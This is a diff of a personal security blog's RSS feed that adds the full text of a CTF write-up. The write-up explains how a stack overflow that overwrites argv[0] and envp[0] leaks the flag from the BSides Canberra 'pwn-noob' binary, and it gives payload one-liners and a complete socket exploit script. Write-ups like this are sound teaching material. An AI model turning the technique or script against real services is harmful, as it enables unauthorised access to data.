@@ -1,49 +1,101 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/">
   <channel>
+    <docs>https://blogs.law.harvard.edu/tech/rss</docs>
     <title>0xbc&#39;s blog</title>
     <link>https://0xbc.blog/</link>
     <description>Recent content on 0xbc&#39;s blog</description>
-    <generator>Hugo -- gohugo.io</generator>
+    <ttl>1440</ttl>
+    <generator>After Dark 7.2.1 (Hugo 0.54.0)</generator>
     <language>en-AU</language>
     <lastBuildDate>Thu, 27 Apr 2017 22:47:58 +0930</lastBuildDate>
     
-	<atom:link href="https://0xbc.blog/index.xml" rel="self" type="application/rss+xml" />
+      <atom:link href="https://0xbc.blog/index.xml" rel="self" type="application/rss+xml" />
     
     
-    <item>
-      <title>BSides Canberra pwn-noob CTF Write-up</title>
-      <link>https://0xbc.blog/post/bsides-cbr-pwn-noob-writeup/</link>
-      <pubDate>Thu, 27 Apr 2017 22:47:58 +0930</pubDate>
-      
-      <guid>https://0xbc.blog/post/bsides-cbr-pwn-noob-writeup/</guid>
-      <description>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
-
-&lt;p&gt;The first exploitation (pwnable) challenge at the BSides Canberra 2017 CTF was &lt;a href=&#34;https://github.com/OJ/bsides-2017-ctf-docker/tree/master/pwn-noob&#34;&gt;pwn-noob&lt;/a&gt; - and clearly, I&amp;rsquo;m an über-noob because I couldn&amp;rsquo;t figure out how to pwn it during the comp.&lt;/p&gt;
-
-&lt;p&gt;However, a couple of nights later (with a couple of gentle nudges from CTF-organiser extraordinaire &lt;a href=&#34;https://twitter.com/TheColonial&#34;&gt;OJ&lt;/a&gt;), I finally got there! Here&amp;rsquo;s a brief rundown of the challenge binary, concluding with a script which implements a working exploit.&lt;/p&gt;</description>
-    </item>
+      <item>
+        <title>BSides Canberra pwn-noob CTF Write-up</title>
+        <link>https://0xbc.blog/post/bsides-cbr-pwn-noob-writeup/</link>
+        <pubDate>Thu, 27 Apr 2017 22:47:58 +0930</pubDate>
+        <dc:creator>Ben Cheney</dc:creator>
+        <guid>https://0xbc.blog/post/bsides-cbr-pwn-noob-writeup/</guid>
+        <description>Introduction The first exploitation (pwnable) challenge at the BSides Canberra 2017 CTF was pwn-noob - and clearly, I&amp;rsquo;m an über-noob because I couldn&amp;rsquo;t figure out how to pwn it during the comp.
+However, a couple of nights later (with a couple of gentle nudges from CTF-organiser extraordinaire OJ), I finally got there! Here&amp;rsquo;s a brief rundown of the challenge binary, concluding with a script which implements a working exploit.
+</description>
+        <category domain="https://0xbc.blog/categories/ctf-writeups">CTF-Writeups</category>
+        <content:encoded><![CDATA[Introduction The first exploitation (pwnable) challenge at the BSides Canberra 2017 CTF was pwn-noob - and clearly, I&amp;rsquo;m an über-noob because I couldn&amp;rsquo;t figure out how to pwn it during the comp.
+However, a couple of nights later (with a couple of gentle nudges from CTF-organiser extraordinaire OJ), I finally got there! Here&amp;rsquo;s a brief rundown of the challenge binary, concluding with a script which implements a working exploit.
+Note that (almost) all of the BSides Canberra 2017 CTF challenges can be spun up at your leisure using Docker - see OJ&#39;s blog and corresponding GitHub repo for more info. Overview, Manual Inspection and Disassembly A version of the binary is provided for local inspection and exploit development (noob_download), but the version with the challenge flag runs remotely and needs to be pwned via a network service running on port 6000 on a Docker image.
+If you&#39;ve never attempted a binary exploitation challenge during a CTF before, the idea is usually to try and find an exploitable flaw in a piece of code that can be leveraged into arbitrary code execution. In a typical scenario, you&#39;d then run shellcode via your exploit in order to retrieve a flag from a target machine. The binary in this case appeared to be a 64-bit ELF executable:
+$ file noob_download noob_download: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4f4bee3f353654b6ab1343af0af59bf888cc21dc, not stripped &amp;ldquo;LSB executable&amp;rdquo; (to my knowledge) indicates that we&amp;rsquo;re not dealing with position-independent code (as opposed to &amp;ldquo;LSB shared object&amp;rdquo;), so ASLR bypasses weren&amp;rsquo;t required.
+The main method (located at address 0x400686) disassembles as per the following:
+Further manual inspection of the binary also revealed the following string in the .rodata section, which looked pretty important&amp;hellip;
+So - the flag string was located at 0x400800, altough the content of the flag on the challenge server was different, of course (drat!).
+Poking the Bear Time to run the program: $ ./noob_download Gimme the data: hello Go on then, break me: ok then $
+So, as far as interactivity goes, the program does the following:
+ Reads from stdin using fgets, storing up to 0x20 (32) bytes of input in the statically-allocated array labeled whateva. Reads from stdin again using fgets, this time storing up to 0x190 (400) bytes of input in the stack variable labeled var_28 (by the disassembler).  The whateva label points to a 32-byte area in the .bss section, located at 0x601040:
+So, given that we&amp;rsquo;re able to get 400 bytes of input on the stack at a location only 0x28 (40) bytes from the frame pointer (during the second lot of input), it seemed like we might be in smash-the-stack-for-fun-and-profit territory. To wit:
+$ python -c &amp;#34;print &amp;#39;\n&amp;#39; &#43; &amp;#39;A&amp;#39;*200&amp;#34; | ./noob_download Gimme the data: Go on then, break me: *** stack smashing detected ***: ./noob_download terminated Aborted (core dumped) Fly in the Ointment Bah, humbug&amp;hellip; a stack canary! Note the line of disassembly at 0x400699, which reads a value from fs:[0x28] and subsequently places it on the stack at var_10. The function epilogue checks that this value hasn&amp;rsquo;t been altered (0x400738 - 0x400745) - if it has, then it calls __stack_chk_fail, which terminates execution.
+I checked to see whether the value being checked was static (and hence could simply be placed on the stack in the right spot as part of the payload), but alas, the canary was being randomly generated during each run of the program. As such, I wasn&amp;rsquo;t going to be able to simply overwrite the saved return pointer and gain code execution.
+At this point, I wasn&amp;rsquo;t really sure what to do next, having never tried to defeat a stack canary before. So, I just started noodling around. Playing around with different payload sizes revealed that the output of the canary check was changing, and in some cases, completely disappearing:
+$ python -c &amp;#34;print &amp;#39;\n&amp;#39; &#43; &amp;#39;A&amp;#39;*263&amp;#34; | ./noob_download Gimme the data: Go on then, break me: *** stack smashing detected ***: terminated Aborted (core dumped) $ python -c &amp;#34;print &amp;#39;\n&amp;#39; &#43; &amp;#39;A&amp;#39;*265&amp;#34; | ./noob_download Gimme the data: Go on then, break me: Segmentation fault (core dumped) Note that with 263 As in the payload, the filename disappeared from the error message, and with 265 As, the message disappeared altogether.
+Crack in the Armor As it turns out, the binary was compiled using the FORTIFY_SOURCE option, with an old version of gcc which is vulnerable to an information disclosure bug, as per http://vulnfactory.org/blog/2010/04/27/fun-with-fortify_source/.
+To understand what&amp;rsquo;s going on here, consider the following description of what the stack looks like during the execution of main, taken from https://www.win.tue.nl/~aeb/linux/hh/stack-layout.html. (Note that lower addresses are shown at the top in this representation.)
+&amp;hellip;
+local variables of main
+saved registers of main
+return address of main
+argc
+argv
+envp
+stack from startup code
+argc
+argv pointers
+NULL that ends argv[]
+environment pointers
+NULL that ends envp[]
+ELF Auxiliary Table
+argv strings
+environment strings
+program name
+NULL
+What we&amp;rsquo;ve done is smashed all the way down from &amp;ldquo;local variables of main&amp;rdquo; and overwritten argv[0] in the &amp;ldquo;argv pointers&amp;rdquo; section. The canary-checking code appears to be blindly reading the contents of argv[0] to get a pointer to a string for printing out the filename as part of its error message.
+That means that we can potentially disclose any strings in the running binary by overwriting argv[0] with a custom location&amp;hellip; such as, the flag contents at 0x400800!
+After some trial-and-error to get the layout right, I found that the following worked: $ python -c &amp;#34;print &amp;#39;\n&amp;#39; &#43; &amp;#39;A&amp;#39;*264 &#43; &amp;#39;\x00\x08\x40\x00\x00\x00\x00\x00&amp;#39;&amp;#34; | ./noob_download Gimme the data: Go on then, break me: *** stack smashing detected ***: BSIDES_CTF{FLAGISHEREONTHESERVER!} terminated Aborted (core dumped)
+Huzzah! We&amp;rsquo;ve smashed down to argv[0] and overwritten it with a (64-bit little-endian) pointer to the flag string. Surely all that remains is to add some scaffolding using sockets to connect to the challenge service (see the script at the end for an example of this), deliver our payload and we&amp;rsquo;re home&amp;hellip; right?? #flaglyfe
+Onwards to Victory&amp;hellip; (eventually) It turns out, however, that when you fire this exploit against the challenge network service, there&amp;rsquo;s one more wrinkle to overcome:
+$ python pwn-noob.py Gimme the data: Go on then, break me: *** $TERM not set. No stack check fail for you! *** Seems like the server wasn&amp;rsquo;t going to surrender the flag without the TERM environment variable being specified. Looks like we&amp;rsquo;d need to overwrite the area where environment variable strings are stored&amp;hellip;
+As per the stack representation above, after the argv pointers, there&amp;rsquo;s a &amp;ldquo;NULL that ends argv[]&amp;rdquo; and then &amp;ldquo;environment pointers&amp;rdquo;: a.k.a. envp[0]. So, we just have to smash down a bit further, past the NULL (which will be 8 bytes for a 64-bit pointer) and then we can overwrite envp[0] with a pointer to something we control, in which we&amp;rsquo;ll place a string that defines the TERM variable.
+I got stuck at this point for aaaaagges, as my initial idea was to place a TERM string in the start of my payload, and then place a pointer back to it at envp[0]. I actually don&amp;rsquo;t quite understand why this approach wasn&amp;rsquo;t working - all I can tell you is, don&amp;rsquo;t try it unless you want to run a serious risk of going insane!
+As it turns out, I had been completely overlooking the other (arguably far more obvious) location we have control of - whateva, a.k.a. 0x601040. All that was required was to do read in a TERM string during the first fgets call, overwrite envp[0] with a pointer to it, and we&amp;rsquo;d be home (sans another nasty &amp;ldquo;surprise&amp;rdquo;, anyway).
+$ python pwn-noob.py Gimme the data: Go on then, break me: *** stack smashing detected *** BSIDES_CTF{d3m_st@kk_proTectionz!} terminated Phew! A script to automate the exploit is shown below.
+Exploit Script import socket import struct import sys # pwn-noob.py # exploit for https://github.com/OJ/bsides-2017-ctf-docker/tree/master/pwn-noob def p(addr): # encode addresses as 64-bit little-endian return struct.pack(&amp;#34;&amp;lt;Q&amp;#34;, addr) if len(sys.argv) &amp;gt; 3: print &amp;#34;Usage: pwn-noob.py [host] [port] (defaults to localhost 6000)&amp;#34; sys.exit() elif len(sys.argv) == 3: host = sys.argv[1] port = int(sys.argv[2]) elif len(sys.argv) == 2: host = sys.argv[1] port = 6000 elif len(sys.argv) == 1: host = &amp;#39;localhost&amp;#39; port = 6000 envstring = &amp;#39;TERM=a&amp;#39; # it doesn&amp;#39;t actually matter what you set TERM to, # so long as it&amp;#39;s set flag_addr = 0x400800 # determined by inspecting the binary buffer_addr = 0x601040 # determined by inspecting the binary flag_start_len = 264 # determined by trial-and-error envp_start_len = 8 # skip over 8 bytes of NULL at the end of  # the argv array to get to envp[0] # newlines required to finish calls to fgets (0x4006e9, 0x40072e) payload1 = envstring &#43; &amp;#39;\n&amp;#39; payload2 = &amp;#39;A&amp;#39;*flag_start_len &#43; p(flag_addr) &#43; &amp;#39;B&amp;#39;*envp_start_len &#43; p(buffer_addr) &#43; &amp;#39;\n&amp;#39; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) # Print first prompt, send TERM string, which will be stored at buffer_addr print s.recv(1024) s.send(payload1) # Print second prompt, send stack-smashing junk &#43; argv[0] overwrite  # &#43; junk &#43; envp[0] overwrite print s.recv(1024) s.send(payload2) # Print out the flag print s.recv(1024) s.close()]]></content:encoded>
+      </item>
     
-    <item>
-      <title>About this site</title>
-      <link>https://0xbc.blog/about/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://0xbc.blog/about/</guid>
-      <description> My name is Ben Cheney, and I&amp;rsquo;m an infosec researcher and practitioner located in Adelaide, Australia. Thanks for stopping by!
+      <item>
+        <title>About this site</title>
+        <link>https://0xbc.blog/about/</link>
+        <dc:creator>Ben Cheney</dc:creator>
+        <guid>https://0xbc.blog/about/</guid>
+        <description> My name is Ben Cheney, and I&amp;rsquo;m an infosec researcher and practitioner located in Adelaide, Australia. Thanks for stopping by!
 This blog is a place for write-ups, notes and rants related to infosec (and tech in general), theology, music and whatever else is on my mind.
 Some of my online habitations:  Twitter GitHub LinkedIn  </description>
-    </item>
+        <content:encoded><![CDATA[ My name is Ben Cheney, and I&amp;rsquo;m an infosec researcher and practitioner located in Adelaide, Australia. Thanks for stopping by!
+This blog is a place for write-ups, notes and rants related to infosec (and tech in general), theology, music and whatever else is on my mind.
+Some of my online habitations:  Twitter GitHub LinkedIn  ]]></content:encoded>
+      </item>
     
-    <item>
-      <title>Terms</title>
-      <link>https://0xbc.blog/terms/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://0xbc.blog/terms/</guid>
-      <description>The content of this site is © Ben Cheney, 2019 , available under the terms of the CC BY-SA 4.0 licence.
+      <item>
+        <title>Terms</title>
+        <link>https://0xbc.blog/terms/</link>
+        <dc:creator>Ben Cheney</dc:creator>
+        <guid>https://0xbc.blog/terms/</guid>
+        <description>The content of this site is © Ben Cheney, 2019 , available under the terms of the CC BY-SA 4.0 licence.
 This site was generated using After Dark for Hugo.</description>
-    </item>
+        <content:encoded><![CDATA[The content of this site is © Ben Cheney, 2019 , available under the terms of the CC BY-SA 4.0 licence.
+This site was generated using After Dark for Hugo.
+]]></content:encoded>
+      </item>
     
   </channel>
 </rss>
